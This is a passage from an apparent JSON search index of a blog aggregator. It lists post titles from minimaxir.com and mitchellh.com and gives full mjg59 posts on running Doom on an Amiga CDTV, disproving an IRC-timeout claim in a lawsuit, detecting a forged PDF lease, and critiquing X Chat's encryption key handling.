-0700</p> <p>\u6458\u8981: It\u2019s an adversarial question for LLMs, but it\u2019s not unfair.</p>"},{"location":"minimaxir.com/#5-llms-can-now-identify-public-figures-in-images","title":"5. LLMs can now identify public figures in images","text":"<p>\u94fe\u63a5: https://minimaxir.com/2025/07/llms-identify-people/</p> <p>\u65e5\u671f: Mon, 28 Jul 2025 13:15:00 -0700</p> <p>\u6458\u8981: ChatGPT and Claude won\u2019t, but Gemini will.</p>"},{"location":"minimaxir.com/01_Nano_Banana_Pro_is_the_best_AI_image_generator__wi/","title":"Nano Banana Pro is the best AI image generator, with caveats","text":"<p>\u539f\u6587\u94fe\u63a5: https://minimaxir.com/2025/12/nano-banana-pro/ \u53d1\u5e03\u65e5\u671f: Mon, 22 Dec 2025 10:45:00 -0800</p> <p>The problem with Nano Banana Pro is that it\u2019s too good.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"minimaxir.com/02_Nano_Banana_can_be_prompt_engineered_for_extremely/","title":"Nano Banana can be prompt engineered for extremely nuanced AI image generation","text":"<p>\u539f\u6587\u94fe\u63a5: https://minimaxir.com/2025/11/nano-banana-prompts/ \u53d1\u5e03\u65e5\u671f: Thu, 13 Nov 2025 09:30:00 -0800</p> <p>Nano Banana allows 32,768 input tokens and I\u2019m going to try to use them all dammit.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"minimaxir.com/03_Claude_Haiku_4.5_does_not_appreciate_my_attempts_t/","title":"Claude Haiku 4.5 does not appreciate my attempts to jailbreak it","text":"<p>\u539f\u6587\u94fe\u63a5: https://minimaxir.com/2025/10/claude-haiku-jailbreak/ \u53d1\u5e03\u65e5\u671f: Fri, 17 Oct 2025 09:15:00 -0700</p> <p>\u201cIs any of that genuinely useful to you? Or were you mainly checking whether that jailbreak attempt would work?\u201d</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"minimaxir.com/04_Can_modern_LLMs_actually_count_the_number_of_b_s_i/","title":"Can modern LLMs actually count the number of b's in \"blueberry\"?","text":"<p>\u539f\u6587\u94fe\u63a5: https://minimaxir.com/2025/08/llm-blueberry/ \u53d1\u5e03\u65e5\u671f: Tue, 12 Aug 2025 09:00:00 -0700</p> <p>It\u2019s an adversarial question for LLMs, but it\u2019s not unfair.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"minimaxir.com/05_LLMs_can_now_identify_public_figures_in_images/","title":"LLMs can now identify public figures in images","text":"<p>\u539f\u6587\u94fe\u63a5: https://minimaxir.com/2025/07/llms-identify-people/ \u53d1\u5e03\u65e5\u671f: Mon, 28 Jul 2025 13:15:00 -0700</p> <p>ChatGPT and Claude won\u2019t, but Gemini will.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"mitchellh.com/","title":"mitchellh.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"mitchellh.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"mitchellh.com/#1-dont-tripwire-yourself-testing-error-recovery-in-zig","title":"1. Don't Trip[wire] Yourself: Testing Error Recovery in Zig","text":"<p>\u94fe\u63a5: https://mitchellh.com/writing/tripwire</p> <p>\u65e5\u671f: Wed, 21 Jan 2026 00:00:00 GMT</p>"},{"location":"mitchellh.com/#2-finding-and-fixing-ghosttys-largest-memory-leak","title":"2. Finding and Fixing Ghostty's Largest Memory Leak","text":"<p>\u94fe\u63a5: https://mitchellh.com/writing/ghostty-memory-leak-fix</p> <p>\u65e5\u671f: Sat, 10 Jan 2026 00:00:00 GMT</p>"},{"location":"mitchellh.com/#3-ghostty-is-now-non-profit","title":"3. Ghostty Is Now Non-Profit","text":"<p>\u94fe\u63a5: https://mitchellh.com/writing/ghostty-non-profit</p> <p>\u65e5\u671f: Wed, 03 Dec 2025 00:00:00 GMT</p>"},{"location":"mitchellh.com/#4-vibing-a-non-trivial-ghostty-feature","title":"4. Vibing a Non-Trivial Ghostty Feature","text":"<p>\u94fe\u63a5: https://mitchellh.com/writing/non-trivial-vibing</p> <p>\u65e5\u671f: Sat, 11 Oct 2025 00:00:00 GMT</p>"},{"location":"mitchellh.com/#5-zig-builds-are-getting-faster","title":"5. Zig Builds Are Getting Faster","text":"<p>\u94fe\u63a5: https://mitchellh.com/writing/zig-builds-getting-faster</p> <p>\u65e5\u671f: Fri, 03 Oct 2025 00:00:00 GMT</p>"},{"location":"mitchellh.com/01_Don_t_Trip_wire__Yourself__Testing_Error_Recovery_/","title":"Don't Trip[wire] Yourself: Testing Error Recovery in Zig","text":"<p>\u539f\u6587\u94fe\u63a5: https://mitchellh.com/writing/tripwire \u53d1\u5e03\u65e5\u671f: Wed, 21 Jan 2026 00:00:00 GMT</p> <p>\u6682\u65e0\u6458\u8981</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"mitchellh.com/02_Finding_and_Fixing_Ghostty_s_Largest_Memory_Leak/","title":"Finding and Fixing Ghostty's Largest Memory Leak","text":"<p>\u539f\u6587\u94fe\u63a5: https://mitchellh.com/writing/ghostty-memory-leak-fix \u53d1\u5e03\u65e5\u671f: Sat, 10 Jan 2026 00:00:00 GMT</p> <p>\u6682\u65e0\u6458\u8981</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"mitchellh.com/03_Ghostty_Is_Now_Non-Profit/","title":"Ghostty Is Now Non-Profit","text":"<p>\u539f\u6587\u94fe\u63a5: https://mitchellh.com/writing/ghostty-non-profit \u53d1\u5e03\u65e5\u671f: Wed, 03 Dec 2025 00:00:00 GMT</p> <p>\u6682\u65e0\u6458\u8981</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"mitchellh.com/04_Vibing_a_Non-Trivial_Ghostty_Feature/","title":"Vibing a Non-Trivial Ghostty Feature","text":"<p>\u539f\u6587\u94fe\u63a5: https://mitchellh.com/writing/non-trivial-vibing \u53d1\u5e03\u65e5\u671f: Sat, 11 Oct 2025 00:00:00 GMT</p> <p>\u6682\u65e0\u6458\u8981</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"mitchellh.com/05_Zig_Builds_Are_Getting_Faster/","title":"Zig Builds Are Getting Faster","text":"<p>\u539f\u6587\u94fe\u63a5: https://mitchellh.com/writing/zig-builds-getting-faster \u53d1\u5e03\u65e5\u671f: Fri, 03 Oct 2025 00:00:00 GMT</p> <p>\u6682\u65e0\u6458\u8981</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"mjg59.dreamwidth.org/","title":"mjg59.dreamwidth.org\\n\\n\u7f51\u7ad9: https://mjg59.dreamwidth.org\\nRSS: https://mjg59.dreamwidth.org/data/rss\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Not here_20260205\\n- How did IRC ping timeouts end up in a lawsuit-_20260205\\n- Where are we on X Chat security-_20260205\\n- Investigating a forged PDF_20260205\\n- Cordoomceps - replacing an Amiga's brain with Doom_20260205\\n","text":""},{"location":"mjg59.dreamwidth.org/Cordoomceps%20-%20replacing%20an%20Amiga%27s%20brain%20with%20Doom_20260205/","title":"Cordoomceps - replacing an Amiga's brain with Doom\\n\\n\u6765\u6e90: https://mjg59.dreamwidth.org\\n\u94fe\u63a5: https://mjg59.dreamwidth.org/73001.html\\n\u65e5\u671f: Tue, 05 Aug 2025 00:30:19 GMT\\n\\n---\\n\\nThere's a lovely device called a\\npistorm\\n, an adapter board that glues a Raspberry Pi GPIO bus to a Motorola 68000 bus. The intended use case is that you plug it into a 68000 device and then run an emulator that reads instructions from hardware (ROM or RAM) and emulates them. You're still limited by the ~7MHz bus that the hardware is running at, but you can run the instructions as fast as you want.\\nThese days you're supposed to run a custom built OS on the Pi that just does 68000 emulation, but initially it ran Linux on the Pi and a userland 68000 emulator process. And, well, that got me thinking. The emulator takes 68000 instructions, emulates them, and then talks to the hardware to implement the effects of those instructions. What if we, well, just don't? What if we just run all of our code in Linux on an ARM core and then talk to the Amiga hardware?\\nWe're going to ignore x86 here, because it's weird - but most hardware that wants software to be able to communicate with it maps itself into the same address space that RAM is in. You can write to a byte of RAM, or you can write to a piece of hardware that's effectively pretending to be RAM[1]. The Amiga wasn't unusual in this respect in the 80s, and to talk to the graphics hardware you speak to a special address range that gets sent to that hardware instead of to RAM. The CPU knows nothing about this. It just indicates it wants to write to an address, and then sends the data.\\nSo, if we are the CPU, we can just indicate that we want to write to an address, and provide the data. And those addresses can correspond to the hardware. So, we can write to the RAM that belongs to the Amiga, and we can write to the hardware that isn't RAM but pretends to be. And that means we can run whatever we want on the Pi and then access Amiga hardware.\\nAnd, obviously, the thing we want to run is Doom, because that's what everyone runs in fucked up hardware situations.\\nDoom was Amiga kryptonite. Its entire graphical model was based on memory directly representing the contents of your display, and being able to modify that by just moving pixels around. This worked because at the time VGA displays supported having a memory layout where each pixel on your screen was represented by a byte in memory containing an 8 bit value that corresponded to a lookup table containing the RGB value for that pixel.\\nThe Amiga was, well, not good at this. Back in the 80s, when the Amiga hardware was developed, memory was expensive. Dedicating that much RAM to the video hardware was unthinkable - the Amiga 1000 initially shipped with only 256K of RAM, and you could fill all of that with a sufficiently colourful picture. So instead of having the idea of each pixel being associated with a specific area of memory, the Amiga used bitmaps. A bitmap is an area of memory that represents the screen, but only represents one bit of the colour depth. If you have a black and white display, you only need one bitmap. If you want to display four colours, you need two. More colours, more bitmaps. And each bitmap is stored in an independent area of RAM. You never use more memory than you need to display the number of colours you want to.\\nBut that means that each bitplane contains packed information - every byte of data in a bitplane contains the bit value for 8 different pixels, because each bitplane contains one bit of information per pixel. To update one pixel on screen, you need to read from every bitmap, update one bit, and write it back, and that's a lot of additional memory accesses. Doom, but on the Amiga, was slow not just because the CPU was slow, but because there was a lot of manipulation of data to turn it into the format the Amiga wanted and then push that over a fairly slow memory bus to have it displayed.\\nThe\\nCDTV\\nwas an aesthetically pleasing piece of hardware that absolutely sucked. It was an Amiga 500 in a hi-fi box with a caddy-loading CD drive, and it ran software that was just awful. There's no path to remediation here. No compelling apps were ever released. It's a terrible device. I love it. I bought one in 1996 because a local computer store had one and I pointed out that the company selling it had gone bankrupt some years earlier and literally nobody in my farming town was ever going to have any interest in buying a CD player that made a whirring noise when you turned it on because it had a fan and eventually they just sold it to me for not much money, and ever since then I wanted to have a CD player that ran Linux and well spoiler 30 years later I'm nearly there. That CDTV is going to be our test subject. We're going to try to get Doom running on it without executing any 68000 instructions.\\nWe're facing two main problems here. The first is that all Amigas have a firmware ROM called Kickstart that runs at powerup. No matter how little you care about using any OS functionality, you can't start running your code until Kickstart has run. This means even documentation describing bare metal Amiga programming assumes that the hardware is already in the state that Kickstart left it in. This will become important later. The second is that we're going to need to actually write the code to use the Amiga hardware.\\nFirst,\\nlet's talk about Amiga graphics\\n. We've already covered bitmaps, but for anyone used to modern hardware that's not the weirdest thing about what we're dealing with here. The CDTV's chipset supports a maximum of 64 colours in a mode called \"Extra Half-Brite\", or EHB, where you have 32 colours arbitrarily chosen from a palette and then 32 more colours that are identical but with half the intensity. For 64 colours we need 6 bitplanes, each of which can be located arbitrarily in the region of RAM accessible to the chipset (\"chip RAM\", distinguished from \"fast ram\" that's only accessible to the CPU). We tell the chipset where our bitplanes are and it displays them. Or, well, it does for a frame - after that the registers that pointed at our bitplanes no longer do, because when the hardware was DMAing through the bitplanes to display them it was incrementing those registers to point at the next address to DMA from. Which means that every frame we need to set those registers back.\\nMaking sure you have code that's called every frame just to make your graphics work sounds intensely irritating, so Commodore gave us a way to avoid doing that. The chipset includes a coprocessor called \"copper\". Copper doesn't have a large set of features - in fact, it only has three. The first is that it can program chipset registers. The second is that it can wait for a specific point in screen scanout. The third (which we don't care about here) is that it can optionally skip an instruction if a certain point in screen scanout has already been reached. We can write a program (a \"copper list\") for the copper that tells it to program the chipset registers with the locations of our bitplanes and then wait until the end of the frame, at which point it will repeat the process. Now our bitplane pointers are always valid at the start of a frame.\\nOk! We know how to display stuff. Now we just need to deal with not having 256 colours, and the whole \"Doom expects pixels\" thing. For the first of these, I stole code from\\nADoom\\n, the only Amiga doom port I could easily find source for. This looks at the 256 colour palette loaded by Doom and calculates the closest approximation it can within the constraints of EHB. ADoom also includes a bunch of CPU-specific assembly optimisation for converting the \"chunky\" Doom graphic buffer into the \"planar\" Amiga bitplanes, none of which I used because (a) it's all for 68000 series CPUs and we're running on ARM, and (b) I have a quad core CPU running at 1.4GHz and I'm going to be pushing all the graphics over a 7.14MHz bus, the graphics mode conversion is\\nnot\\ngoing to be the bottleneck here. Instead I just wrote a series of nested for loops that iterate through each pixel and update each bitplane and called it a day. The set of bitplanes I'm operating on here is allocated on the Linux side so I can read and write to them without being restricted by the speed of the Amiga bus (remember, each byte in each bitplane is going to be updated 8 times per frame, because it holds bits associated with 8 pixels), and then copied over to the Amiga's RAM once the frame is complete.\\nAnd, kind of astonishingly, this works! Once I'd figured out where I was going wrong with RGB ordering and which order the bitplanes go in, I had a recognisable copy of Doom running. Unfortunately there were weird graphical glitches - sometimes blocks would be entirely the wrong colour. It took me a while to figure out what was going on and then I felt stupid. Recording the screen and watching in slow motion revealed that the glitches often showed parts of two frames displaying at once. The Amiga hardware is taking responsibility for scanning out the frames, and the code on the Linux side isn't synchronised with it at all. That means I could update the bitplanes while the Amiga was scanning them out, resulting in a mashup of planes from two different Doom frames being used as one Amiga frame. One approach to avoid this would be to tie the Doom event loop to the Amiga, blocking my writes until the end of scanout. The other is to use double-buffering - have two sets of bitplanes, one being displayed and the other being written to. This consumes more RAM but since I'm not using the Amiga RAM for anything else that's not a problem. With this approach I have two copper lists, one for each set of bitplanes, and switch between them on each frame. This improved things a lot but not entirely, and there's still glitches when the palette is being updated (because there's only one set of colour registers), something Doom does rather a lot, so I'm going to need to implement proper synchronisation.\\nExcept. This was only working if I ran a 68K emulator first in order to run Kickstart. If I tried accessing the hardware without doing that, things were in a weird state. I could update the colour registers, but accessing RAM didn't work - I could read stuff out, but anything I wrote vanished. Some more digging cleared that up. When you turn on a CPU it needs to start executing code from somewhere. On modern x86 systems it starts from a hardcoded address of 0xFFFFFFF0, which was traditionally a long way any RAM. The 68000 family instead reads its start address from address 0x00000004, which overlaps with where the Amiga chip RAM is. We can't write anything to RAM until we're executing code, and we can't execute code until we tell the CPU where the code is, which seems like a problem. This is solved on the Amiga by powering up in a state where the Kickstart ROM is \"overlayed\" onto address 0. The CPU reads the start address from the ROM, which causes it to jump into the ROM and start executing code there. Early on, the code tells the hardware to stop overlaying the ROM onto the low addresses, and now the RAM is available. This is poorly documented because it's not something you need to care if you execute Kickstart which every actual Amiga does and I'm only in this position because I've made poor life choices, but ok that explained things. To turn off the overlay you write to a register in one of the Complex Interface Adaptor (CIA) chips, and things start working like you'd expect.\\nExcept, they don't. Writing to that register did nothing for me. I assumed that there was some other register I needed to write to first, and went to the extent of tracing every register access that occurred when running the emulator and replaying those in my code. Nope, still broken. What I finally discovered is that you need to pulse the reset line on the board before some of the hardware starts working - powering it up doesn't put you in a well defined state, but resetting it does.\\nSo, I now have a slightly graphically glitchy copy of Doom running without any sound, displaying on an Amiga whose brain has been replaced with a parasitic Linux. Further updates will likely make things even worse. Code is, of course,\\navailable\\n.\\n[1] This is why we had trouble with late era 32 bit systems and 4GB of RAM - a bunch of your hardware wanted to be in the same address space and so you couldn't put RAM there so you ended up with less than 4GB of RAM\\ncomments","text":""},{"location":"mjg59.dreamwidth.org/How%20did%20IRC%20ping%20timeouts%20end%20up%20in%20a%20lawsuit-_20260205/","title":"How did IRC ping timeouts end up in a lawsuit?\\n\\n\u6765\u6e90: https://mjg59.dreamwidth.org\\n\u94fe\u63a5: https://mjg59.dreamwidth.org/73777.html\\n\u65e5\u671f: Wed, 17 Dec 2025 13:17:23 GMT\\n\\n---\\n\\nI recently won\\na lawsuit\\nagainst Roy and Rianne Schestowitz, the authors and publishers of the Techrights and Tuxmachines websites. The short version of events is that they were subject to an online harassment campaign, which they incorrectly blamed me for. They responded with a large number of defamatory online posts about me, which the judge described as\\nunsubstantiated character assassination\\nand consequently awarded me significant damages. That's not what this post is about, as such. It's about the sole meaningful claim made that tied me to the abuse.\\nIn the defendants'\\ndefence and counterclaim\\n[1], 15.27 asserts in part\\nThe facts linking the Claimant to the sock puppet accounts include, on the IRC network: simultaneous dropped connections to the mjg59_ and elusive_woman accounts. This is so unlikely to be coincidental that the natural inference is that the same person posted under both names\\n. \"elusive_woman\" here is an account linked to the harassment, and \"mjg59_\" is me. This is actually a surprisingly interesting claim to make, and it's worth going into in some more detail.\\nThe event in question occurred on the\\n28th of April, 2023\\n. You can see a line reading\\nelusive_woman has quit (Ping timeout: 2m30s)\\n, followed by one reading\\nmjg59_ has quit (Ping timeout: 2m30s)\\n. The timestamp listed for the first is 09:52, and for the second 09:53. Is that actually simultaneous? We can actually gain some more information - if you hover over the timestamp links on the right hand side you can see that the link is actually accurate to the second even if that's not displayed. The first event took place at 09:52:52, and the second at 09:53:03. That's 11 seconds apart, which is clearly not simultaneous, but maybe it's close enough. Figuring out more requires knowing what a \"ping timeout\" actually means here.\\nThe IRC server in question is running\\nErgo\\n(link to\\nsource code\\n), and the relevant function is\\nhandleIdleTimeout()\\n. The logic here is fairly simple - track the time since activity was last seen from the client. If that time is longer than DefaultIdleTimeout (which defaults to 90 seconds) and a ping hasn't been sent yet, send a ping to the client. If a ping has been sent and the timeout is greater than DefaultTotalTimeout (which defaults to 150 seconds), disconnect the client with a \"Ping timeout\" message. There's no special logic for handling the ping reply - a pong simply counts as any other client activity and resets the \"last activity\" value and timeout.\\nWhat does this mean? Well, for a start, two clients running on the same system will only have simultaneous ping timeouts if their last activity was simultaneous. Let's imagine a machine with two clients, A and B. A sends a message at 02:22:59. B sends a message 2 seconds later, at 02:23:01. The idle timeout for A will fire at 02:24:29, and for B at 02:24:31. A ping is sent for A at 02:24:29 and is responded to immediately - the idle timeout for A is now reset to 02:25:59, 90 seconds later. The machine hosting A and B has its network cable pulled out at 02:24:30. The ping to B is sent at 02:24:31, but receives no reply. A minute later, at 02:25:31, B quits with a \"Ping timeout\" message. A ping is sent to A at 02:25:59, but receives no reply. A minute later, at 02:26:59, A quits with a \"Ping timeout\" message. Despite both clients having their network interrupted simultaneously, the ping timeouts occur 88 seconds apart.\\nSo, two clients disconnecting with ping timeouts 11 seconds apart is not incompatible with the network connection being interrupted simultaneously - depending on activity, simultaneous network interruption may result in disconnections up to 90 seconds apart. But another way of looking at this is that network interruptions may occur up to 90 seconds apart and generate simultaneous disconnections[2]. Without additional information it's impossible to determine which is the case.\\nThis already casts doubt over the assertion that the disconnection was simultaneous, but if this is unusual enough it's still potentially significant. Unfortunately for the Schestowitzes, even looking just at the elusive_woman account, there were several cases where elusive_woman and another user had a ping timeout within 90 seconds of each other - including one case where elusive_woman and schestowitz[TR] disconnect\\n40 seconds apart\\n. By the Schestowitzes argument, it's also a natural inference that elusive_woman and schestowitz[TR] (one of Roy Schestowitz's accounts) are the same person.\\nWe didn't actually need to make this argument, though. In England it's necessary to file a witness statement describing the evidence that you're going to present in advance of the actual court hearing. Despite being warned of the consequences on multiple occasions the Schestowitzes never provided any witness statements, and as a result weren't allowed to provide any evidence in court, which made for a fairly foregone conclusion.\\n[1] As well as defending themselves against my claim, the Schestowitzes made a counterclaim on the basis that I had engaged in a campaign of harassment against them. This counterclaim failed.\\n[2] Client A and client B both send messages at 02:22:59. A falls off the network at 02:23:00, has a ping sent at 02:24:29, and has a ping timeout at 02:25:29. B falls off the network at 02:24:28, has a ping sent at 02:24:29, and has a ping timeout at 02:25:29. Simultaneous disconnects despite over a minute of difference in the network interruption.\\ncomments","text":""},{"location":"mjg59.dreamwidth.org/Investigating%20a%20forged%20PDF_20260205/","title":"Investigating a forged PDF\\n\\n\u6765\u6e90: https://mjg59.dreamwidth.org\\n\u94fe\u63a5: https://mjg59.dreamwidth.org/73317.html\\n\u65e5\u671f: Wed, 24 Sep 2025 22:22:34 GMT\\n\\n---\\n\\nI had to rent a house for a couple of months recently, which is long enough in California that it pushes you into proper tenant protection law. As landlords tend to do, they failed to return my security deposit within the 21 days\\nrequired by law\\n, having already failed to provide the required notification that I was entitled to an inspection before moving out. Cue some tedious argumentation with the letting agency, and eventually me threatening to take them to small claims court.\\nThis post is not about that.\\nNow, under Californian law, the onus is on the\\nlandlord\\nto hold and return the security deposit - the agency has no role in this. The only reason I was talking to them is that my lease didn't mention the name or address of the landlord (another\\nlegal violation\\n, but the outcome is just that you get to serve the landlord via the agency). So it was a bit surprising when I received an email from the owner of the agency informing me that they did not hold the deposit and so were not liable - I already knew this.\\nThe odd bit about this, though, is that they sent me another copy of the contract, asserting that it made it clear that the landlord held the deposit. I read it, and instead found a clause reading\\nSECURITY: The security deposit will secure the performance of Tenant\u2019s obligations. IER may, but will not be obligated to, apply all portions of said deposit on account of Tenant\u2019s obligations. Any balance remaining upon termination will be returned to Tenant. Tenant will not have the right to apply the security deposit in payment of the last month\u2019s rent. Security deposit held at IER Trust Account.\\n, where IER is\\nInternational Executive Rentals\\n, the agency in question. Why send me a contract that says you hold the money while you're telling me you don't? And then I read further down and found this:\\nOk, fair enough, there's an addendum that says the landlord has it (I've removed the landlord's name, it's present in the original).\\nExcept. I had no recollection of that addendum. I went back to the copy of the contract I had and discovered:\\nHuh! But obviously I could just have edited that to remove it (there's no obvious reason for me to, but whatever), and then it'd be my word against theirs. However, I'd been sent the document via\\nRightSignature\\n, an online document signing platform, and they'd added a certification page that looked like this:\\nInterestingly, the certificate page was identical in both documents, including the checksums, despite the content being different. So, how do I show which one is legitimate? You'd think given this certificate page this would be trivial, but RightSignature provides no documented mechanism whatsoever for anyone to verify any of the fields in the certificate, which is annoying but let's see what we can do anyway.\\nFirst up, let's look at the PDF metadata.\\npdftk\\nhas a\\ndump_data\\ncommand that dumps the metadata in the document, including the creation date and the modification date. My file had both set to identical timestamps in June, both listed in UTC, corresponding to the time I'd signed the document. The file containing the addendum? The same creation time, but a modification time of this Monday, shortly before it was sent to me. This time, the modification timestamp was in Pacific Daylight Time, the timezone currently observed in California. In addition, the data included two ID fields, ID0 and ID1. In my document both were identical, in the one with the addendum ID0 matched mine but ID1 was different.\\nThese ID tags are intended to be some form of representation (such as a hash) of the document. ID0 is set when the document is created and should not be modified afterwards - ID1 initially identical to ID0, but changes when the document is modified. This is intended to allow tooling to identify whether two documents are modified versions of the same document. The identical ID0 indicated that the document with the addendum was originally identical to mine, and the different ID1 that it had been modified.\\nWell, ok, that seems like a pretty strong demonstration. I had the \"I have a very particular set of skills\" conversation with the agency and pointed these facts out, that they were an extremely strong indication that my copy was authentic and their one wasn't, and they responded that the document was \"re-sealed\" every time it was downloaded from RightSignature and that would explain the modifications. This doesn't seem plausible, but it's an argument. Let's go further.\\nMy next move was\\npdfalyzer\\n, which allows you to pull a PDF apart into its component pieces. This revealed that the documents were identical, other than page 3, the one with the addendum. This page included tags entitled \"touchUp_TextEdit\", evidence that the page had been modified using Acrobat. But in itself, that doesn't prove anything - obviously it had been edited at some point to insert the landlord's name, it doesn't prove whether it happened before or after the signing.\\nBut in the process of editing, Acrobat appeared to have renamed all the font references on that page into a different format. Every other page had a consistent naming scheme for the fonts, and they matched the scheme in the page 3 I had. Again, that doesn't tell us whether the renaming happened before or after the signing. Or does it?\\nYou see, when I completed my signing, RightSignature inserted my name into the document, and did so using a font that wasn't otherwise present in the document (Courier, in this case). That font was named identically throughout the document, except on page 3, where it was named in the same manner as every other font that Acrobat had renamed. Given the font wasn't present in the document until after I'd signed it, this is proof that the page was edited\\nafter\\nsigning.\\nBut eh this is all very convoluted. Surely there's an easier way? Thankfully yes, although I hate it. RightSignature had sent me a link to view my signed copy of the document. When I went there it presented it to me as the original PDF with my signature overlaid on top. Hitting F12 gave me the network tab, and I could see a reference to a\\nbase.pdf\\n. Downloading that gave me the original PDF, pre-signature. Running\\nsha256sum\\non it gave me an identical hash to the \"Original checksum\" field. Needless to say, it did not contain the addendum.\\nWhy do this? The only explanation I can come up with (and I am obviously guessing here, I may be incorrect!) is that International Executive Rentals realised that they'd sent me a contract which could mean that they\\nwere\\nliable for the return of my deposit, even though they'd already given it to my landlord, and after realising this added the addendum, sent it to me, and assumed that I just wouldn't notice (or that, if I did, I wouldn't be able to prove anything). In the process they went from an extremely unlikely possibility of having civil liability for a few thousand dollars (even if they were holding the deposit it's still the landlord's legal duty to return it, as far as I can tell) to doing something that looks extremely like\\nforgery\\n.\\nThere's a hilarious followup. After this happened, the agency offered to do a screenshare with me showing them logging into RightSignature and showing the signed file with the addendum, and then proceeded to do so. One minor problem - the \"Send for signature\" button was still there, just below a field saying \"Uploaded: 09/22/25\". I asked them to search for my name, and it popped up two hits - one marked draft, one marked completed. The one marked completed? Didn't contain the addendum.\\ncomments","text":""},{"location":"mjg59.dreamwidth.org/Not%20here_20260205/","title":"Not here\\n\\n\u6765\u6e90: https://mjg59.dreamwidth.org\\n\u94fe\u63a5: https://mjg59.dreamwidth.org/74084.html\\n\u65e5\u671f: Mon, 05 Jan 2026 22:26:23 GMT\\n\\n---\\n\\nHello! I am not posting here any more. You can find me\\nhere\\ninstead. Most Planets should be updated already (I've an MR open for Planet Gnome), but if you're subscribed to my feed directly please update it.\\ncomments","text":""},{"location":"mjg59.dreamwidth.org/Where%20are%20we%20on%20X%20Chat%20security-_20260205/","title":"Where are we on X Chat security?\\n\\n\u6765\u6e90: https://mjg59.dreamwidth.org\\n\u94fe\u63a5: https://mjg59.dreamwidth.org/73625.html\\n\u65e5\u671f: Mon, 20 Oct 2025 23:36:19 GMT\\n\\n---\\n\\nAWS had an outage today and Signal was unavailable for some users for a while. This has confused some people, including Elon Musk, who are concerned that having a dependency on AWS means that Signal could somehow be compromised by anyone with sufficient influence over AWS (it can't). Which means we're back to the richest man in the world recommending his own \"X Chat\", saying\\nThe messages are fully encrypted with no advertising hooks or strange \u201cAWS dependencies\u201d such that I can\u2019t read your messages even if someone put a gun to my head\\n.\\nElon is either uninformed about his own product, lying, or both.\\nAs I wrote\\nback in June\\n, X Chat genuinely end-to-end encrypted, but ownership of the keys is complicated. The encryption key is stored using the\\nJuicebox\\nprotocol, sharded between multiple backends. Two of these are asserted to be HSM backed - a discussion of the commissioning ceremony was recently posted\\nhere\\n. I have not watched the almost 7 hours of video to verify that this was performed correctly, and I also haven't been able to verify that the public keys included in the post were the keys generated during the ceremony, although that may be down to me just not finding the appropriate point in the video (sorry, Twitter's video hosting doesn't appear to have any skip feature and would frequently just sit spinning if I tried to seek to far and I should probably just download them and figure it out but I'm not doing that now). With enough effort it would probably also have been possible to fake the entire thing - I have no reason to believe that this has happened, but it's not externally verifiable.\\nBut let's assume these published public keys are legitimately the ones used in the HSM Juicebox realms[1] and that everything was done correctly. Does that prevent Elon from obtaining your key and decrypting your messages? No.\\nOn startup, the X Chat client makes an API call called GetPublicKeysResult, and the public keys of the realms are returned. Right now when I make that call I get the public keys listed above, so there's at least some indication that I'm going to be communicating with actual HSMs. But what if that API call returned different keys? Could Elon stick a proxy in front of the HSMs and grab a cleartext portion of the key shards? Yes, he absolutely could, and then he'd be able to decrypt your messages.\\n(I will accept that there is a plausible argument that Elon is telling the truth in that even if you held a gun to his head he's not smart enough to be able to do this himself, but that'd be true even if there were no security whatsoever, so it still says nothing about the security of his product)\\nThe solution to this is remote attestation - a process where the device you're speaking to proves its identity to you. In theory the endpoint could attest that it's an HSM running this specific code, and we could look at the Juicebox repo and verify that it's that code and hasn't been tampered with, and then we'd know that our communication channel was secure. Elon hasn't done that, despite it being table stakes for this sort of thing (Signal uses remote attestation to verify the enclave code used for private contact discovery, for instance, which ensures that the client will refuse to hand over any data until it's verified the identity and state of the enclave). There's no excuse whatsoever to build a new end-to-end encrypted messenger which relies on a network service for security without providing a trustworthy mechanism to verify you're speaking to the real service.\\nWe know how to do this properly. We have done for years. Launching without it is unforgivable.\\n[1] There are three Juicebox realms overall, one of which doesn't appear to use HSMs, but you need at least two in order to obtain the key so at least part of the key will always be held in 